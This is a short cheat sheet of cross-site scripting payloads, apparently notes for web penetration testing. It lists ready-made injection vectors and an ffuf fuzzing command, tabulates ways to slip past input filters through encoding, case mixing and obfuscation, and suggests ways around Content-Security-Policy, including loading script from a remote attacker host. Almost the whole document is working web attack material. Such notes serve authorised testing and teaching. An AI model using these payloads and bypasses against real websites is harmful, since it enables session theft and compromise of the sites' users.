# XSS payloads & filter bypasses

## Go-to payloads
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<script>alert(1)</script>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">x</a>
"><svg onload=alert(1)>
'-alert(1)-'
</script><svg onload=alert(1)>
```
Fuzz list: `wordlists/xss/xss-payloads.txt` (`ffuf -u "$T/?q=FUZZ" -w ... -mr 'onerror=alert'`).

## Filter bypasses
| Blocked | Try |
|---|---|
| `<script>` | event handlers (`onerror`, `onload`, `ontoggle`, `onfocus`), `<svg>` |
| case-sensitive keyword | `<ScRiPt>`, `<IMG SRC=x OnErRoR=...>` |
| stripped once | `<scr<script>ipt>` |
| spaces | `<svg/onload=alert(1)>`, `<img/src/onerror=alert(1)>` |
| `(` `)` | ``alert`1` ``, `onerror=alert;throw 1` |
| quotes | `String.fromCharCode(...)`, backticks, `/regex/.source` |
| `alert` word | `window['al'+'ert'](1)`, `top[atob('YWxlcnQ=')](1)`, `eval(atob('...'))` |
| `javascript:` | `jav&#x09;ascript:`, `JaVaScRiPt:`, `&#106;avascript:` |
| `<`/`>` encoded, attribute context | event handler inside the attribute (`" onmouseover="...`) |
| length limit | `<svg onload=grant()>`, `<script src=//x.yz>` (short domain) |

## CSP
Read `Content-Security-Policy`. `unsafe-inline` → inline works. Allowed CDN (jsonp/angular) →
script gadgets. No `base-uri` → `<base href=//you/>`. `script-src 'self'` + upload → host JS on the
site itself.
